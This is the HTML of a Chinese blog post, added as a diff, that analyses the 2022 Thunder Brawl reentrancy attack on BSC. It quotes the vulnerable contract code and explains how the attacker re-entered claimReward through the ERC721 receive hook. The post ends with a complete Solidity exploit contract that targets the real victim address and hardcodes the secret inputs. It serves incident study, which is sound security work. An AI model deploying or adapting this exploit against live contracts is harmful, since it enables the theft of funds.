@@ -1,0 +1,779 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!--pjax：防止跳转页面音乐暂停-->
+ <script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hometown.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/hometown.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"emmanuelwh.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":280,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":{"valine":{"order":-1}},"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="1. Thunder Brawl重入攻击事件相关信息2022年9月30日发生在BSC上的重入攻击，回调函数属于ERC721的hook类型  攻击交易的哈希：Transaction Hash (Txhash) Details | BscScan⁤  攻击者的地址：Attacker Address | BscScan⁤  攻击合约的地址：Exploit Contract Address | BscSc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Defi安全-Thunder Brawl攻击事件分析">
+<meta property="og:url" content="https://emmanuelwh.github.io/2024/02/28/Defi%E5%AE%89%E5%85%A8-Thunder-Brawl%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="来自门头沟学院的Emmanuel">
+<meta property="og:description" content="1. Thunder Brawl重入攻击事件相关信息2022年9月30日发生在BSC上的重入攻击，回调函数属于ERC721的hook类型  攻击交易的哈希：Transaction Hash (Txhash) Details | BscScan⁤  攻击者的地址：Attacker Address | BscScan⁤  攻击合约的地址：Exploit Contract Address | BscSc">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202402282058873.png">
+<meta property="og:image" content="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202402282102830.png">
+<meta property="article:published_time" content="2024-02-28T12:02:34.000Z">
+<meta property="article:modified_time" content="2024-02-28T13:57:14.394Z">
+<meta property="article:author" content="Emmanuel">
+<meta property="article:tag" content="Defi安全">
+<meta property="article:tag" content="安全事件分析">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202402282058873.png">
+
+<link rel="canonical" href="https://emmanuelwh.github.io/2024/02/28/Defi%E5%AE%89%E5%85%A8-Thunder-Brawl%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Defi安全-Thunder Brawl攻击事件分析 | 来自门头沟学院的Emmanuel</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+
+  <meta name="referrer" content="no-referrer">
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">来自门头沟学院的Emmanuel</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">科研  R&B  网球</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">9</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">20</span></a>
+
+  </li>
+        <li class="menu-item menu-item-papersummary">
+
+    <a href="/Paper-summary" rel="section"><i class="fa fa-heartbeat fa-fw"></i>PaperSummary</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+  <a href="https://github.com/Emmanuelwh" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://emmanuelwh.github.io/2024/02/28/Defi%E5%AE%89%E5%85%A8-Thunder-Brawl%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/hometown.jpg">
+      <meta itemprop="name" content="Emmanuel">
+      <meta itemprop="description" content="XJTUer 区块链安全小白 <br> 坚信AI变革生产力  Web3变革生产关系">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="来自门头沟学院的Emmanuel">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Defi安全-Thunder Brawl攻击事件分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2024-02-28 20:02:34 / Modified: 21:57:14" itemprop="dateCreated datePublished" datetime="2024-02-28T20:02:34+08:00">2024-02-28</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Defi%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Defi安全</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">安全事件分析</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2024/02/28/Defi%E5%AE%89%E5%85%A8-Thunder-Brawl%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2024/02/28/Defi%E5%AE%89%E5%85%A8-Thunder-Brawl%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>644</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>1 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="1-Thunder-Brawl重入攻击事件相关信息"><a href="#1-Thunder-Brawl重入攻击事件相关信息" class="headerlink" title="1. Thunder Brawl重入攻击事件相关信息"></a>1. Thunder Brawl重入攻击事件相关信息</h2><p>2022年9月30日发生在BSC上的重入攻击，回调函数属于ERC721的hook类型</p>
+<ul>
+<li><p>攻击交易的哈希：<a target="_blank" rel="noopener" href="https://bscscan.com/tx/0x57aa9c85e03eb25ac5d94f15f22b3ba3ab2ef60b603b97ae76f855072ea9e3a0">Transaction Hash (Txhash) Details | BscScan⁤</a></p>
+</li>
+<li><p>攻击者的地址：<a target="_blank" rel="noopener" href="https://bscscan.com/address/0xbc62b9ba570ad783d21e5eb006f3665d3f6bba93">Attacker Address | BscScan⁤</a></p>
+</li>
+<li><p>攻击合约的地址：<a target="_blank" rel="noopener" href="https://bscscan.com/address/0xfed1b640633fd0a4d77315d229918ab1f6e612f9">Exploit Contract Address | BscScan</a></p>
+</li>
+<li><p>受害合约的地址：<a target="_blank" rel="noopener" href="https://bscscan.com/address/0xae191ca19f0f8e21d754c6cab99107ed62b6fe53#code">House_Wallet| BscScan</a>，<a target="_blank" rel="noopener" href="https://bscscan.com/address/0x72e901f1bb2bfa2339326dfb90c5cec911e2ba3c#code">THB_Roulette| BscScan</a></p>
+</li>
+<li><p>phalcon攻击序列分析：<a target="_blank" rel="noopener" href="https://phalcon.blocksec.com/explorer/tx/bsc/0x57aa9c85e03eb25ac5d94f15f22b3ba3ab2ef60b603b97ae76f855072ea9e3a0">Phalcon Explorer (blocksec.com)</a></p>
+</li>
+</ul>
+<h2 id="2-Thunder-Brawl重入攻击事件分析"><a href="#2-Thunder-Brawl重入攻击事件分析" class="headerlink" title="2. Thunder Brawl重入攻击事件分析"></a>2. Thunder Brawl重入攻击事件分析</h2><p>该项目应该是一个NFT的游戏合约</p>
+<ol>
+<li>攻击合约首先调用受害合约<code>House Wallet</code>中的shoot函数</li>
+</ol>
+<p>从bscscan上看一下该函数的源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"> function shoot(</span><br><span class="line">        uint256 random,</span><br><span class="line">        uint256 gameId,</span><br><span class="line">        bool feestate,</span><br><span class="line">        uint256 _x,</span><br><span class="line">        string memory name,</span><br><span class="line">        address _add,</span><br><span class="line">        bool nftcheck,</span><br><span class="line">        bool dystopianCheck</span><br><span class="line">    ) external payable &#123;</span><br><span class="line">        require(gameMode);</span><br><span class="line">//首先判断传入的金额是否在规定的范围之内，并计算相应的费用</span><br><span class="line">        if (0.32 * 10**18 &gt;= msg.value &amp;&amp; 0.006 * 10**18 &lt;= msg.value) &#123;</span><br><span class="line">            playerFee = ((msg.value * 38) / 1038);</span><br><span class="line">            holderFee = ((playerFee * 25) / 1000);</span><br><span class="line">            liquidityFee = ((playerFee * 1) / 1000);</span><br><span class="line">            ownerFee = ((playerFee * 125) / 100000);</span><br><span class="line">//根据传入的值，判断是否与预先设定的哈希值相等，可以看guesswin函数的源码</span><br><span class="line">            bool checkWinstatus = guessWin(_x, name, _add);</span><br><span class="line">//如果猜对了，将玩家地址和赢得的金额记录到映射中</span><br><span class="line">            if (checkWinstatus == true) &#123;</span><br><span class="line">                winners[gameId][msg.sender] = (msg.value - playerFee);</span><br><span class="line">                winStatus = true;</span><br><span class="line">            &#125;</span><br><span class="line">//相关费用的转账</span><br><span class="line">            if (feestate == true) &#123;</span><br><span class="line">                payable(Fee_Wallet).transfer(holderFee);</span><br><span class="line">                payable(Liqudity_Address).transfer(liquidityFee);</span><br><span class="line">                payable(owner()).transfer(ownerFee);</span><br><span class="line">            &#125;</span><br><span class="line">//随机数的生成和额外NFT奖励的计算与判断，满足相应的条件即用rewardStatus进行相应记录，然而这里攻击者是有可能进行操控的</span><br><span class="line">            randomNumber =</span><br><span class="line">                uint256(</span><br><span class="line">                    keccak256(</span><br><span class="line">                        abi.encodePacked(</span><br><span class="line">                            msg.sender,</span><br><span class="line">                            block.timestamp,</span><br><span class="line">                            randomNumber</span><br><span class="line">                        )</span><br><span class="line">                    )</span><br><span class="line">                ) %</span><br><span class="line">                10;</span><br><span class="line">            if (winStatus == true) &#123;</span><br><span class="line">                if (nftcheck == true &amp;&amp; randomNumber == random) &#123;</span><br><span class="line">                    rewardStatus = true;</span><br><span class="line">                &#125;</span><br><span class="line">                winStatus = false;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                if (dystopianCheck == true &amp;&amp; randomNumber == random) &#123;</span><br><span class="line">                    rewardStatus = true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            fakeUsers.push(msg.sender);</span><br><span class="line">            gameMode = false;</span><br><span class="line">            dangerMode = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function guessWin(</span><br><span class="line">        uint256 _x,</span><br><span class="line">        string memory name,</span><br><span class="line">        address _add</span><br><span class="line">    ) public view returns (bool) &#123;</span><br><span class="line">        return sha256(abi.encode(_x, name, _add)) == hashValueTwo;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>随后攻击者合约调用了受害合约的claimReward函数，通过函数名可知是计算相应奖励的函数</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">    function claimReward(</span><br><span class="line">        uint256 _ID,</span><br><span class="line">        address payable _player,</span><br><span class="line">        uint256 _amount,</span><br><span class="line">        bool _rewardStatus,</span><br><span class="line">        uint256 _x,</span><br><span class="line">        string memory name,</span><br><span class="line">        address _add</span><br><span class="line">    ) external &#123;</span><br><span class="line">        require(gameMode);</span><br><span class="line">  //首先是对玩家的身份进行相应的确认，验证逻辑不需要详细了解</span><br><span class="line">        bool checkValidity = guess(_x, name, _add);</span><br><span class="line">//如果_amount金额数量对上的话，则给攻击合约转账相应的奖励，_player就是攻击合约的地址</span><br><span class="line">        if (checkValidity == true) &#123;</span><br><span class="line">            if (winners[_ID][_player] == _amount) &#123;</span><br><span class="line">                _player.transfer(_amount * 2);</span><br><span class="line">//这部分发送额外的奖励</span><br><span class="line">                if (_rewardStatus == true) &#123;</span><br><span class="line">                    sendReward();</span><br><span class="line">                &#125;</span><br><span class="line">                delete winners[_ID][_player];</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                if (_rewardStatus == true) &#123;</span><br><span class="line">                    sendRewardDys();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            rewardStatus = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>接下来进入Thunderbrawl Roulette (THBR)中看一下reward函数的逻辑</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  function reward(address to,uint256 _mintAmount) external &#123;</span><br><span class="line">        uint256 supply = totalSupply();</span><br><span class="line">        uint256 rewardSupply = rewardTotal;</span><br><span class="line">        require(rewardSupply &lt;= rewardSize,&quot;&quot;);</span><br><span class="line">        for (uint256 i = 1; i &lt;= _mintAmount; i++) &#123;          </span><br><span class="line">          _safeMint(to, supply + i); </span><br><span class="line">          rewardTotal++;         </span><br><span class="line">        &#125;</span><br><span class="line">  &#125;</span><br><span class="line">//上述的RewardStatus攻击者可以操控，这里攻击者将获得NFT奖励</span><br><span class="line">  function _safeMint(</span><br><span class="line">        address to,</span><br><span class="line">        uint256 tokenId,</span><br><span class="line">        bytes memory data</span><br><span class="line">    ) internal virtual &#123;</span><br><span class="line">        _mint(to, tokenId);</span><br><span class="line">        require(</span><br><span class="line">            _checkOnERC721Received(address(0), to, tokenId, data),</span><br><span class="line">            &quot;ERC721: transfer to non ERC721Receiver implementer&quot;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>这里给攻击合约发送NFT奖励的时候，会触发攻击者的onERC721Received函数，如下图所示</li>
+</ol>
+<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202402282058873.png" alt="image-20240228205826174"></p>
+<ol start="5">
+<li>继续观察phalcon的攻击序列，在onERC721Received中攻击者进行重入，再次调用了claimReward函数，传入的参数与之前一模一样，这时攻击者再次获利，重复进入了4次</li>
+</ol>
+<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202402282102830.png" alt="image-20240228210235520"></p>
+<h2 id="3-Thunder-Brawl攻击合约"><a href="#3-Thunder-Brawl攻击合约" class="headerlink" title="3. Thunder Brawl攻击合约"></a>3. Thunder Brawl攻击合约</h2><p>根据Defihacklab的Foundry仿写的攻击合约代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">interface IERC721Receiver &#123;</span><br><span class="line">    function onERC721Received(</span><br><span class="line">        address operator,</span><br><span class="line">        address from,</span><br><span class="line">        uint256 tokenId,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external returns (bytes4);</span><br><span class="line">&#125;</span><br><span class="line">interface HouseWallet&#123;</span><br><span class="line">    function winners(uint256 id, address player) view external returns(uint256);</span><br><span class="line">    function claimReward(</span><br><span class="line">        uint256 _ID,</span><br><span class="line">        address payable _player,</span><br><span class="line">        uint256 _amount,</span><br><span class="line">        bool _rewardStatus,</span><br><span class="line">        uint256 _x,</span><br><span class="line">        string memory name,</span><br><span class="line">        address _add</span><br><span class="line">    ) external;</span><br><span class="line">    function shoot(</span><br><span class="line">        uint256 random,</span><br><span class="line">        uint256 gameId,</span><br><span class="line">        bool feestate,</span><br><span class="line">        uint256 _x,</span><br><span class="line">        string memory name,</span><br><span class="line">        address _add,</span><br><span class="line">        bool nftcheck,</span><br><span class="line">        bool dystopianCheck</span><br><span class="line">    ) external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ContractTest&#123;</span><br><span class="line"></span><br><span class="line">    HouseWallet houseWallet = HouseWallet(0xae191Ca19F0f8E21d754c6CAb99107eD62B6fe53);</span><br><span class="line">    uint256 randomNumber =  12345678000000000000000000;</span><br><span class="line"></span><br><span class="line">    uint256 gameId = 1;</span><br><span class="line">    bool feestate = false;</span><br><span class="line">     // sha256(abi.encode(_x, name, _add)) == hashValueTwo maybe off-chain calculate</span><br><span class="line">    uint256 _x = 2845798969920214568462001258446;</span><br><span class="line">    string  name = &quot;HATEFUCKINGHACKERSTHEYNEVERCANHACKTHISIHATEPREVIOUS&quot;;</span><br><span class="line">    address _add = 0x6Ee709bf229c7C2303128e88225128784c801ce1;</span><br><span class="line"></span><br><span class="line">    bool nftcheck = true;</span><br><span class="line">    bool dystopianCheck = true;</span><br><span class="line"></span><br><span class="line">    address payable add = payable(address(this));</span><br><span class="line">    bool _rewardStatus = true;</span><br><span class="line">    // sha256(abi.encode(_x, name, _add)) == hashValue  maybe off-chain calculate</span><br><span class="line">    uint256 _x1 = 969820990102090205468486;</span><br><span class="line">    string name1 = &quot;WELCOMETOTHUNDERBRAWLROULETTENOWYOUWINTHESHOOTINGGAME&quot;;</span><br><span class="line">    IERC721 THBR = IERC721(0x72e901F1bb2BfA2339326DfB90c5cEc911e2ba3C); // Thunderbrawl Roulette Contract</span><br><span class="line"></span><br><span class="line">	receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function attack() public&#123;</span><br><span class="line">        houseWallet.shoot&#123;value: 0.32 ether&#125;(randomNumber, gameId, feestate, _x, name, _add, nftcheck, dystopianCheck);</span><br><span class="line">        uint256 _amount = houseWallet.winners(gameId, add);</span><br><span class="line">        houseWallet.claimReward(gameId, add, _amount, _rewardStatus, _x1, name1, _add);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function onERC721Received(</span><br><span class="line">        address _operator, </span><br><span class="line">        address _from, </span><br><span class="line">        uint256 _tokenId, </span><br><span class="line">        bytes calldata _data</span><br><span class="line">        ) </span><br><span class="line">        payable </span><br><span class="line">        external </span><br><span class="line">        returns (bytes4)&#123;</span><br><span class="line">            uint256 _amount = houseWallet.winners(gameId, add);</span><br><span class="line">            if(address(houseWallet).balance &gt;= _amount * 2)&#123;</span><br><span class="line">                houseWallet.claimReward(gameId, add, _amount, _rewardStatus, _x1, name1, _add);</span><br><span class="line">            &#125;</span><br><span class="line">            return bytes4(keccak256(&quot;onERC721Received(address,address,uint256,bytes)&quot;));</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+      
+  <div class="popular-posts-header">Related Posts</div>
+  <ul class="popular-posts">
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\2024\01\12\Defi安全--Zunami Protocol攻击事件分析\" rel="bookmark">Defi安全--Zunami Protocol攻击事件分析</a></div>
+    </li>
+    <li class="popular-posts-item">
